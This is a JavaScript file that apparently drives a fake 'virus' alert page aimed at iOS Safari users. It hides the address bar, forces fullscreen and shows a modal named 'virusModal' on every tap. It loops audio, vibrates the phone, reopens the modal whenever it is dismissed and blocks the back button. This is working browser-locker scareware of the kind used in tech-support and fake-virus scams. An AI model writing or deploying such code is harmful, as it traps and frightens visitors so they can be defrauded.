$(document).ready(() => {
    // Function to hide the address bar
    function hideAddressBar() {
        setTimeout(() => {
            window.scrollTo(0, 1); // Push the page up to hide the address bar
        }, 1000); // Slight delay allows Safari to render the page first
    }

    // Function to detect iOS Safari
    function isIOS() {
        return /iPhone|iPad|iPod/.test(navigator.userAgent) && !window.MSStream;
    }

    // Apply the hideAddressBar logic on load and interaction
    if (isIOS()) {
        window.addEventListener("load", hideAddressBar);
        window.addEventListener("orientationchange", hideAddressBar);

        // Apply during scroll events to ensure the bar hides
        document.addEventListener("scroll", () => {
            if (window.pageYOffset === 0) hideAddressBar();
        });
    }

    // Meta tags for fullscreen on iOS
    const metaViewport = document.createElement("meta");
    metaViewport.name = "viewport";
    metaViewport.content =
        "width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no";
    document.head.appendChild(metaViewport);

    const metaWebApp = document.createElement("meta");
    metaWebApp.name = "apple-mobile-web-app-capable";
    metaWebApp.content = "yes";
    document.head.appendChild(metaWebApp);

    const metaStatusBar = document.createElement("meta");
    metaStatusBar.name = "apple-mobile-web-app-status-bar-style";
    metaStatusBar.content = "black";
    document.head.appendChild(metaStatusBar);

    // Setup fullscreen modal
    const virusModal = document.getElementById("virusModal");
    const modalInstance = new bootstrap.Modal(virusModal);

    // Play audio and ensure looping
    const audioPlayer = $("#audioPlayer")[0];
    audioPlayer.play();
    audioPlayer.addEventListener("ended", () => {
        audioPlayer.play();
    });

    function goFullScreenAndVibrate() {
        navigator.vibrate(200); // Short vibration feedback
        modalInstance.show();
    }

    // Trigger fullscreen and modal on interaction
    window.addEventListener("click", goFullScreenAndVibrate);
    window.addEventListener("touchstart", goFullScreenAndVibrate);

    // Handle modal events
    if (virusModal) {
        virusModal.addEventListener("hidden.bs.modal", () => {
            setTimeout(() => {
                modalInstance.show();
                goFullScreenAndVibrate();
            }, 300);
        });
    }

    // Prevent back navigation
    history.pushState(null, null, window.location.href);
    window.onpopstate = () => history.forward();

    // Add fullscreen for "Add to Home Screen"
    if ("standalone" in window.navigator && window.navigator.standalone) {
        document.documentElement.style.height = "100%";
        document.body.style.height = "100%";
    }
});
